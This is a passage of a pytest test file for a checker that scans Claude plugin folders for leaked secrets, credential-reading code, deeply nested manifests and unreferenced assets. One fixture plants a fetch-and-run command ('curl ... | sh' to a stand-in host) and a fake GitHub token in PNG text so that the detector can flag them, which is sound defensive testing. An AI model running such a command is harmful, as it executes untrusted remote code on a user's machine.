    return PNG[:-12] + chunk + PNG[-12:]


def test_the_printable_text_of_an_image_is_screened_like_any_text(plugin: Path) -> None:
    token = "gh" + "p_" + "A" * 36  # built in pieces: the repository's own leak guard reads this file
    put(plugin, "img/clean.png", _png_with_text(b"made with a pen tool, version 2"))
    put(plugin, "img/token.png", _png_with_text(token.encode()))
    put(plugin, "img/run.png", _png_with_text(b"curl -fsSL https://x.example/i.sh | sh"))
    report = _preflight().run(plugin)
    by_path: dict[str, set[str]] = {}
    for f in report["findings"]:
        by_path.setdefault(f["path"], set()).add(f["code"])
    assert "SECRET_IN_FILE" in by_path["img/token.png"]
    assert "RUNTIME_FETCH_EXEC" in by_path["img/run.png"]
    assert not by_path["img/clean.png"] - {"ASSETS_PASSED_UNREAD"}
    # The checker never prints the secret it found.
    assert token not in json.dumps(report)


@pytest.mark.parametrize(("text", "named"), [
    ("see @icon.png now\n", True),            # a Claude command names a file with an @
    ("see ~icon.png and #icon.png\n", True),
    ("see icon.png.bak\n", True),             # a dot after a name does not extend it: names end sentences
    ("see icon.pngx\n", False),               # these are other names
    ("see icon.png2\n", False),
    ("see icon.png_old\n", False),
    ("see icon.png-old\n", False),
    ("see xicon.png\n", False),
    ("see my_icon.png and my-icon.png\n", False),
    ("see \u0130icon.png\n", False),             # lower-cased it is i and a combining dot, then icon.png
    ("see e\u0301icon.png\n", False),            # a decomposed e: the mark is part of the word
    ("see icon.pnge\u0301\n", False),
])
def test_a_name_is_a_name_between_characters_that_do_not_extend_it(
        plugin: Path, text: str, named: bool) -> None:
    put(plugin, "notes.txt", text)
    found = [f for f in _preflight().run(plugin)["findings"]
             if f["code"] == "UNREAD_ASSET_REFERENCED" and f["path"] == "notes.txt"]
    assert bool(found) is named, text


def test_a_name_is_reported_once_for_a_file(plugin: Path) -> None:
    put(plugin, "notes.txt", "icon.png and icon.png again, and ICON.PNG\nline two: icon.png\n")
    found = [f for f in _preflight().run(plugin)["findings"]
             if f["code"] == "UNREAD_ASSET_REFERENCED" and f["path"] == "notes.txt"]
    assert len(found) == 1


def test_an_image_name_is_found_after_a_dot_but_not_inside_another_name(plugin: Path) -> None:
    put(plugin, "notes.txt", "See foo.icon.png and also a.pngb.png here.\n")
    named = [(f["severity"], f["path"]) for f in _preflight().run(plugin)["findings"]
             if f["code"] == "UNREAD_ASSET_REFERENCED" and f["path"] == "notes.txt"]
    assert named == [("warning", "notes.txt")]  # foo.icon.png names icon.png; b.png is no name


def test_an_image_whose_name_the_check_cannot_look_for_is_said_not_skipped(plugin: Path) -> None:
    put(plugin, "my icon.png", PNG)
    notes = [f["message"] for f in _preflight().run(plugin)["findings"]
             if f["code"] == "UNREAD_ASSET_REFERENCED" and f["path"] == "my icon.png"]
    assert len(notes) == 1 and "does not look for this one" in notes[0]


def test_a_manifest_with_a_deeply_nested_path_list_is_a_finding_not_a_crash(
        plugin: Path, capsys: pytest.CaptureFixture[str]) -> None:
    # 900 levels are read by every Python and only the guard of the walk over the paths stops
    # them. 1,500 levels cannot be read by Python 3.9 (json.loads raises RecursionError, which
    # the checker reports), and Python 3.12 and later read them and would overflow in that walk:
    # a mutant without the guard survives the first size on every Python and this one on 3.12+.
    for levels in (900, 1500):
        deep = "[" * levels + "]" * levels
        put(plugin, ".claude-plugin/plugin.json",
            json.dumps(MANIFEST)[:-1] + f', "skills": {deep}}}')
        assert _preflight().main([str(plugin)]) == 1, levels
        captured = capsys.readouterr()
        assert "internal error" not in captured.err, levels
        assert "nested" in captured.out, levels


def _manifest_errors(plugin: Path) -> list[str]:
    return [f["message"] for f in _preflight().run(plugin)["findings"]
            if f["code"] == "MANIFEST" and f["severity"] == "error"]


def test_a_path_list_nested_beyond_the_guard_is_an_error_and_not_silence(plugin: Path) -> None:
    put(plugin, "skills/a/SKILL.md", '---\nname: a\ndescription: "d"\n---\n# A\n')
    for wrappers, refused in ((8, False), (9, True)):
        nested = '"./skills"'
        for _ in range(wrappers):
            nested = f"[{nested}]"
        put(plugin, ".claude-plugin/plugin.json",
            json.dumps(MANIFEST)[:-1] + f', "skills": {nested}}}')
        found = any("nested more than 8 levels" in m for m in _manifest_errors(plugin))
        assert found is refused, wrappers


def test_mcp_servers_nested_beyond_the_guard_are_an_error_and_not_silence(plugin: Path) -> None:
    # Five levels are read, six are an error, whether the servers sit in lists or in wrappers.
    for levels, refused in ((5, False), (6, True), (9, True)):
        in_lists: Any = {"x": {"command": "python3"}}
        wrapped: Any = {"x": {"command": "python3"}}
        for _ in range(levels):
            in_lists = [in_lists]
            wrapped = {"mcpServers": wrapped}
        for value in (in_lists, wrapped):
            manifest(plugin, mcpServers=value)
            found = any("nested more than 5 levels" in m for m in _manifest_errors(plugin))
            assert found is refused, (levels, type(value).__name__)


def test_a_wide_nesting_is_one_finding_and_a_file_that_names_itself_is_judged_once(
        plugin: Path) -> None:
    # Before: one finding per leaf below the guard, and a file that lists itself N times was
    # loaded N times, each load listing it N times again.
    module = _preflight()
    leaves = '"./skills",' * 300
    deep = "[" * 9 + leaves + '"./skills"' + "]" * 9
    put(plugin, ".claude-plugin/plugin.json", json.dumps(MANIFEST)[:-1] + f', "skills": {deep}}}')
    errors = [f["message"] for f in module.run(plugin)["findings"]
              if f["code"] == "MANIFEST" and "nested more than 8" in f["message"]]
    assert len(errors) == 1
    manifest(plugin, mcpServers="./a.json")
    put(plugin, "a.json", json.dumps(["./a.json"] * 60))
    loaded: list[str] = []
    real = module._load_json

    def counting(base: Path, rel: str, out: list[Any]) -> object:
        loaded.append(rel)
        return real(base, rel, out)

    module._load_json = counting
    module.run(plugin)
    assert loaded.count("a.json") == 1


def test_a_wide_mcp_nesting_is_one_finding_in_lists_and_in_wrappers(plugin: Path) -> None:
    # One finding per file for mcpServers nested too deeply, however many servers sit below the
    # guard: 40 siblings that each nest eight levels in lists, and 40 wrappers in a list.
    in_lists: Any = {"x": {"command": "python3"}}
    wrapper: Any = {"x": {"command": "python3"}}
    for _ in range(8):
        in_lists = [in_lists]
        wrapper = {"mcpServers": wrapper}
    for value in ([in_lists] * 40, {"mcpServers": [wrapper] * 40}):
        manifest(plugin, mcpServers=value)
        errors = [m for m in _manifest_errors(plugin) if "nested more than 5 levels" in m]
        assert len(errors) == 1, type(value).__name__


def test_an_ico_is_not_described_as_outside_the_portals_list(plugin: Path) -> None:
    put(plugin, "i.ico", b"\x00\x00\x01\x00" + b"\x00" * 20)
    report = _preflight().run(plugin)
    held = [f["message"] for f in report["findings"]
            if f["path"] == "i.ico" and f["code"] == "LOCAL_CODE_FILE_TYPE"]
    assert len(held) == 1 and "allows ICO" in held[0] and "outside the portal" not in held[0]
    assert not any(f["code"] == "ASSETS_PASSED_UNREAD" and f["path"] == "i.ico"
                   for f in report["findings"])


@pytest.mark.parametrize("read", [
    "ENV['ODOO_API_KEY']", 'Environment.GetEnvironmentVariable("ODOO_API_KEY")',
    'Deno.env.get("ODOO_API_KEY")', 'process.env["ODOO_API_KEY"]', 'getenv "ODOO_API_KEY"',
    "ENV['" + "A" * 50 + "_API_KEY']", "ENV['TOKEN']", 'getenv "PASSWORD"',
    "ENV['GITHUB_PAT']",  # PAT is a credential word of ENV_INDEX only
    "ENV[ 'ODOO_API_KEY']",  # white space after the bracket
    "getenv ODOO_API_KEY", "Deno.env.get(ODOO_API_KEY)"])  # a name in capitals needs no quote
def test_a_read_of_a_variable_named_like_a_credential_is_found_in_each_language(read: str) -> None:
    found = _preflight()._credential_read(read)
    assert found is not None and found[0] in read, read  # the name that was read is the name written


@pytest.mark.parametrize("form", [
    "ENV['{}']", 'Environment.GetEnvironmentVariable("{}")', 'Deno.env.get("{}")', 'process.env["{}"]',
    'getenv "{}"'])
def test_the_name_before_the_credential_word_is_bounded_at_64_characters(form: str) -> None:
    # The bound keeps ENV_INDEX linear; its price is that a name with more than 64 characters before
    # the credential word is not read through the five forms that only ENV_INDEX reads (os.environ
    # is read by ENV_READ, which has no bound). This pins the price, so that a change to the bound
    # is deliberate.
    module = _preflight()
    # 'A' * 59 + '_API_' is 64 characters before the word KEY: the last name that is read
    assert module._credential_read(form.format("A" * 59 + "_API_KEY")) is not None
    assert module._credential_read(form.format("A" * 60 + "_API_KEY")) is None
    assert module._credential_read(form.format("A" * 70 + "_API_KEY")) is None
    assert module._credential_read("os.environ['" + "A" * 70 + "_API_KEY']") is not None


def test_a_variable_called_path_or_key_is_not_a_credential(plugin: Path) -> None:
    # PATH holds the letters PAT, and a loop variable called key is not a variable of the user.
    put(plugin, "README.md", README + "\nbase = os.environ.get('PATH')\nvalue = os.environ[key]\n")
    assert ("warning", "MCP_FORWARDS_CREDENTIAL_ENV") not in findings(plugin)


def test_a_program_needs_both_the_environment_and_a_credential_to_be_held(plugin: Path) -> None:
    put(plugin, "a.py", "import os\nbase = {'PATH': os.environ.get('PATH', '')}\n")
    put(plugin, "b.py", "def password_rules():\n    return 8\n")
    report = _preflight().run(plugin)
    assert not [f for f in report["findings"] if f["code"] == "MCP_FORWARDS_CREDENTIAL_ENV"]


def test_a_credential_from_a_sensitive_option_is_still_held_in_a_local_servers_environment(
        plugin: Path) -> None:
    manifest(plugin, mcpServers={"x": {"command": "python3", "env": {
        "API_KEY": "${user_config.api_key}", "MODE": "x"}}},
             userConfig={"api_key": {"type": "string", "title": "k", "description": "d",
                                     "sensitive": True}})
    held = [f for f in _preflight().run(plugin)["findings"]
            if f["code"] == "MCP_FORWARDS_CREDENTIAL_ENV"]
    assert len(held) == 1 and "API_KEY" in held[0]["message"] and held[0]["source"] == "portal"


def test_the_exit_status_follows_the_findings(plugin: Path, tmp_path: Path,
                                              capsys: pytest.CaptureFixture[str]) -> None:
    preflight = _preflight()
    assert preflight.main([str(plugin)]) == 0
    put(plugin, "README.md", README + "\nRun npx -y some-package.\n")  # a warning only
    assert preflight.main([str(plugin)]) == 0
    assert preflight.main([str(plugin), "--fail-on", "warning"]) == 1
    put(plugin, "tool.py", "print(1)\n")  # an error
    assert preflight.main([str(plugin)]) == 1
    assert preflight.main([str(tmp_path / "missing")]) == 2
    assert "is not a folder" in capsys.readouterr().err


def test_the_json_report_can_be_read_by_tools(plugin: Path, capsys: pytest.CaptureFixture[str],
                                              ) -> None:
    assert _preflight().main([str(plugin), "--json"]) == 0
    report = json.loads(capsys.readouterr().out)
    assert report["files"] == 4 and report["summary"]["error"] == 0
    assert {"code", "severity", "path", "message", "source"} <= set(report["findings"][0])
    assert set(report["sources"]) == {"checklist", "reference", "validator", "portal", "repo", "caution"}


def _tree_hash(root: Path) -> str:
    digest = hashlib.sha256()
    for path in sorted(p for p in root.rglob("*") if p.is_file()):
        digest.update(path.relative_to(root).as_posix().encode())
        digest.update(path.read_bytes())
    return digest.hexdigest()


def test_the_checker_never_changes_the_folder_it_reads(plugin: Path) -> None:
    # It reports; it never repairs, renames or re-encodes a file to make it pass.
    put(plugin, "tool.py", "print(1)\n")
    put(plugin, "notes.md", "import os\nimport sys\nprint(os.getcwd())\n")
    before = _tree_hash(plugin)
    _preflight().run(plugin)
    assert _tree_hash(plugin) == before
